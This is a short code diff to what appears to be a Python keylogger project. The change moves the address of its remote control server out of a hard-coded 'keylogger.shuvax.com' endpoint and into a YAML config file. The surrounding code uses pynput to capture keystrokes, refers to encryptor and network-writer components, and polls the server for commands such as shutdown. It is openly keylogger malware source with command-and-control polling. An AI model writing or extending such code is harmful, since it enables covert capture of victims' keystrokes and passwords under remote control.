@@ -1,7 +1,12 @@
 from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
-import threading, time, requests, sys
+import threading, time, requests, sys,yaml
+
+with open("config.yaml", "r") as f:
+    config = yaml.safe_load(f)
+
+URL = config['general']['base_url']
 
 
 class KeyLoggerManager(IKeyLoggerManager):
@@ -42,7 +47,7 @@ class KeyLoggerManager(IKeyLoggerManager):
             self.__key_logger.clear_logged_keys()
 
             try:
-                response = requests.get(f"https://keylogger.shuvax.com/api/check_commands/{self.__serial_number}")
+                response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
                 if response.status_code == 200:
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
